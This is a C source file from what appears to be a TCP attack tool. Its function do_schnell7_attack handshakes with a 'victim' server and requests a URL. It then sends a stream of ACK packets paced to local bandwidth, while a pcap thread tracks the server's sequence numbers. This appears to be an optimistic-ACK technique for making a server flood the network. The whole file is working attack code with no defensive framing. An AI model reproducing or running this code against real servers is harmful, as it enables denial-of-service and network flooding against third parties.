#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>
#include <assert.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/types.h>
#include <pcap.h>
#include <netinet/tcp.h>
#include <sched.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <signal.h>




#include "schnell.h"
#include "packetqueue.h"

void handleAlarm(int);
void * packetGrabber7(void *);


int do_schnell7_attack(rawSock){
	int retries=0;
	long usSendDelay;		// time to send one ACK
	pthread_t grabber;
	struct timespec nsDelay;




	// do three way handshake
    do {
      sendSYN(rawSock);
      retries++;
    } while( getSYNACK(rawSock) && (retries < 10));
	if(retries>=10){
      fprintf(stderr,"Never Got SYNACK :(\n");
      exit(1);
	}

    victimSequence++;
    localSequence++;
    sendACK(rawSock);
    sendHTMLGET(rawSock);   // send "GET URL\r\n" to server

	Window = 65533;	// set the recv window all of the way open
			// encode the state in the window, for debug
	nice(-19);

	usSendDelay = 1000000*(double)54/LocalBandwidth;	// how many microsecs between ACKs
			// ACK = 20 tcp bytes, 20 ip bytes, and 14 for ethernet frame
	nsDelay.tv_sec=0;
	nsDelay.tv_nsec=(double)usSendDelay/1000;

	printf("LocalBandwidth %ld -> %ld uSeconds\n",LocalBandwidth,usSendDelay);
	gotFINorRST=0;
	pthread_create(&grabber,NULL,packetGrabber7,&rawSock);
	while(1){
		myusSleep(usSendDelay);
		if(gotFINorRST){
			printf("GOT FIN or RST... exiting\n");
			break;
		}
		victimSequence++;
		sendACK(rawSock);
	}


	return 0;
}


void * packetGrabber7(void *arg){
	struct tcphdr *tcph;
	const unsigned char * packet;
	struct pcap_pkthdr pcap_hdr;
	int rawSock;

	rawSock=*(int *)arg;
	while(1){
		packet = pcap_next(PcapHandle,&pcap_hdr);
		if(packet==NULL)
			continue;
		tcph = (struct tcphdr*) (packet + 34);  // 14 + 20 = ethernet + ip hdrs
		if(tcph->fin||tcph->rst)
			gotFINorRST=1;
		victimSequence=ntohl(tcph->seq);	// IGNORE the amount of data in the packet
							// weird but worthwhile
	}
	return NULL;
}
